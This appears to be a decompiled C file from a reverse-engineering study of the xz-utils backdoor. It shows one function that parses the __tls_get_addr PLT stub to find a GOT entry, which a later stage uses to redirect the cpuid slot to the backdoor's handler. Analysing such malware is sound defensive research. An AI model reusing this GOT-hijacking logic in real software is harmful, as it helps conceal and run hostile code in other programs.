// /home/kali/xzre-ghidra/xzregh/103FA0_update_got_address.c
// Function: update_got_address @ 0x103FA0
// Calling convention: __stdcall
// Prototype: void * __stdcall update_got_address(elf_entry_ctx_t * entry_ctx)


/*
 * AutoDoc: Disassembles the `__tls_get_addr` PLT trampoline, derives the real GOT entry address, and caches it in the entry context. Stage two depends on that pointer to find ld.so's ELF header and to swap the cpuid GOT slot over to its handler.
 */
#include "xzre_types.h"


void * update_got_address(elf_entry_ctx_t *entry_ctx)

{
  void *pvVar1;
  ulong uVar2;
  long lVar3;
  void *pvVar4;
  
  get_tls_get_addr_random_symbol_got_offset(entry_ctx);
  pvVar1 = (void *)((long)&_Lx86_coder_destroy +
                   (_Llzma_block_uncomp_encode_0 - (entry_ctx->got_ctx).got_offset));
  (entry_ctx->got_ctx).return_address = (void *)0x0;
  (entry_ctx->got_ctx).cpuid_fn = (void *)0x0;
  uVar2 = (ulong)(*(char *)((long)pvVar1 + 1) == '\x0f');
  lVar3 = uVar2 * 4;
  if (*(char *)((long)pvVar1 + uVar2 * 4) == -0xe) {
    lVar3 = lVar3 + 1;
  }
  pvVar4 = (void *)0x0;
  if ((void *)(ulong)(*(ushort *)((long)pvVar1 + lVar3) + 1 & 0xffff) ==
      (entry_ctx->got_ctx).got_ptr) {
    pvVar4 = (void *)((long)pvVar1 + lVar3 + -0x12 + (ulong)*(uint *)((long)pvVar1 + lVar3 + 2));
  }
  (entry_ctx->got_ctx).got_ptr = pvVar4;
  return pvVar1;
}

